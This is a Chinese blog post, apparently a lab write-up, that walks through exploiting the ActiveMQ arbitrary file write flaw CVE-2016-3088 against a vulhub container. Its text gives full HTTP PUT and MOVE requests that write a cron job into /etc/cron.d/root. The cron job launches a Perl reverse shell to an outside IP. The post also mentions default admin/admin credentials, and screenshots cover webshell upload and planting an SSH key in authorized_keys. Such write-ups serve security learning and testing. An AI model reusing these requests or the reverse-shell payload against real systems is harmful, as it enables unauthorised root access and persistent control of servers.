# ActiveMQ 任意文件写入漏洞（CVE-2016-3088） - mrhonest - 博客园

> 原文：[`www.cnblogs.com/mrhonest/p/11269586.html`](https://www.cnblogs.com/mrhonest/p/11269586.html)

## 上传 webshell

### 容器用 vulhub 的

![](img/480af998df7038686d741218ae1bca4d.png)

![](img/f536d0ffc61f87fa670ca03fedc30d8f.png)

### PUT 一个 jsp 文件

![](img/dcd223d431c91af6f7ceee533d60d992.png)

### MOVE 到 api 目录

![](img/430fb452e222168d00285c81865baf7f.png)

## 默认的 ActiveMQ 账号密码均为 admin，首先访问 http://your-ip:8161/admin/test/systemProperties.jsp，查看 ActiveMQ 的绝对路径：

![](img/480dc7774e7f923f3ea8d394dc05b264.png)

### 访问

![](img/b1fcdd72d93f33fc3704e1421baf150b.png)

# 其它利用方法--转

## 写入 crontab，自动化弹 shell

#### 这是一个比较稳健的方法。首先上传 cron 配置文件（注意，换行一定要\n，不能是\r\n，否则 crontab 执行会失败）

```
PUT /fileserver/1.txt HTTP/1.1
Host: localhost:8161
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 248

*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="192.168.198.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}; 
```

#### 将其移动到/etc/cron.d/root：

```
MOVE /fileserver/1.txt HTTP/1.1
Destination: file:///etc/cron.d/root
Host: localhost:8161
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0 
```

#### 如果上述两个请求都返回 204 了，说明写入成功。等待反弹 shell：

#### 这个方法需要 ActiveMQ 是 root 运行，否则也不能写入 cron 文件。

## 上传 SSH 公钥方式

#### 既然可以任意文件上传和移动，很自然的可以想到上传我们的 ssh 公钥，从而实现 SSH 方式登录。

#### 首先生成密钥对。（如果已存在则不需要）

![](img/96761984c4e6915dff044e49a2425e7e.png)

#### 然后上传、移动到/root/.ssh/并重命名为 authorized_keys

![](img/bb00ba5d0edc5d28679ebce855c478d9.png)
![](img/4d9056f1a903bb065c553c6747e494b5.png)

#### 之后直接 ssh 登录即可。

![](img/a6e397dc422b47032eac71565e1afd65.png)

参考:[`paper.seebug.org/346/`](https://paper.seebug.org/346/)
[`github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md`](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md)